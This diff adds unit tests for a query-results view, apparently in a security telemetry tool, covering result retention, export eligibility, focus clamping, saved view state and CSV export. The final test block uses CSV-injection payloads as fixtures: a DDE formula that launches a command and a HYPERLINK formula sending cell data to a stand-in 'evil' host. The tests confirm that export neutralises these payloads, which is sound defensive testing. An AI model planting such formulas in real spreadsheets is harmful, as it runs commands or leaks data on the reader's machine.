@@ -1,8 +1,10 @@
 import * as assert from "node:assert/strict";
 import {
   cellText,
+  clampFocus,
   filterRows,
   formatRows,
+  neutraliseFormula,
   sortKind,
   sortRows,
   toCsv,
@@ -11,9 +13,12 @@ import {
 } from "../../../src/features/query/format";
 import {
   applyProgress,
+  exportable,
   formatMs,
+  keepable,
   pendingTabs,
   progressFromEvent,
+  queryViewState,
   tabSummary,
   tabsFromDocument,
 } from "../../../src/features/query/results";
@@ -151,5 +156,79 @@ describe("query results (#17)", () => {
     assert.equal(formatMs(250), "250 ms");
     assert.equal(formatMs(1800), "1.8 s");
     assert.equal(formatMs(125_000), "2 min 5 s");
+  });
+});
+
+describe("query: results kept from a closed panel (opentide.query.retainResults)", () => {
+  it("keeps a finished run, never one closed while running", () => {
+    assert.equal(keepable({ phase: "running" }), false);
+    assert.equal(keepable(undefined), false);
+    for (const phase of ["done", "failed", "cancelled"]) assert.equal(keepable({ phase }), true);
+  });
+});
+
+describe("query: what Copy and Export act on", () => {
+  const [pending] = pendingTabs(["B"]);
+  const tab = (overrides: object) => ({ ...(pending as NonNullable<typeof pending>), ...overrides });
+  it("only a finished tab of its own rows: never a failed or empty one, whose table holds another's", () => {
+    const ok = tab({ status: "ok", rows: [{ a: 1 }], columns: [{ name: "a" }] });
+    assert.equal(exportable(ok, "done"), true);
+    assert.equal(exportable(ok, "running"), false);
+    assert.equal(exportable(tab({ status: "failed" }), "done"), false);
+    assert.equal(exportable(tab({ status: "ok", rows: [] }), "done"), false);
+    assert.equal(exportable(pending, "done"), false);
+    assert.equal(exportable(undefined, "done"), false);
+  });
+});
+
+describe("query: the table's focus and view across tabs", () => {
+  it("moves a focused cell into a tab with fewer columns or rows", () => {
+    assert.deepEqual(clampFocus({ row: 4, column: 8 }, 10, 3), { row: 4, column: 2 });
+    assert.deepEqual(clampFocus({ row: 40, column: 1 }, 10, 3), { row: 9, column: 1 });
+    assert.deepEqual(clampFocus({ row: 3, column: 3 }, 0, 0), { row: 0, column: 0 });
+  });
+
+  it("keeps the selected tab, filter and sort, and nothing it cannot read", () => {
+    const state = {
+      selected: "prod",
+      table: { filter: "lsass", filterColumn: "User", sort: { column: "Time", descending: true } },
+    };
+    assert.deepEqual(queryViewState(JSON.parse(JSON.stringify(state))), state);
+    assert.deepEqual(queryViewState({ selected: 3, table: { filter: 1 } }), {});
+    assert.deepEqual(queryViewState(undefined), {});
+    assert.deepEqual(queryViewState({ table: { filter: "", filterColumn: "", sort: { column: 1 } } }), {
+      table: { filter: "", filterColumn: "" },
+    });
+  });
+});
+
+describe("query: CSV of attacker-controlled telemetry (CSV injection)", () => {
+  it("prefixes a quote to cells a spreadsheet would evaluate, and leaves numbers alone", () => {
+    const columns = [{ name: "CommandLine" }, { name: "User" }];
+    const rows = [
+      { CommandLine: "=cmd|' /C calc'!A0", User: "+SUM(1+1)" },
+      { CommandLine: '=HYPERLINK("http://evil/?"&A1,"x")', User: -2 },
+      { CommandLine: "@SUM(1+1)*cmd|' /C calc'!A0", User: "-2+3" },
+      { CommandLine: "\tx", User: "plain" },
+    ];
+    assert.equal(
+      toCsv(columns, rows),
+      [
+        "CommandLine,User",
+        "'=cmd|' /C calc'!A0,'+SUM(1+1)",
+        `"'=HYPERLINK(""http://evil/?""&A1,""x"")",-2`,
+        "'@SUM(1+1)*cmd|' /C calc'!A0,'-2+3",
+        "'\tx,plain",
+        "",
+      ].join("\r\n"),
+    );
+    assert.equal(neutraliseFormula("-1.5e3"), "-1.5e3");
+    assert.equal(neutraliseFormula("+7"), "+7");
+    assert.equal(neutraliseFormula("- list item"), "'- list item");
+    assert.equal(
+      formatRows("json", columns, [rows[0] as (typeof rows)[0]]).includes("'="),
+      false,
+      "JSON untouched",
+    );
   });
 });
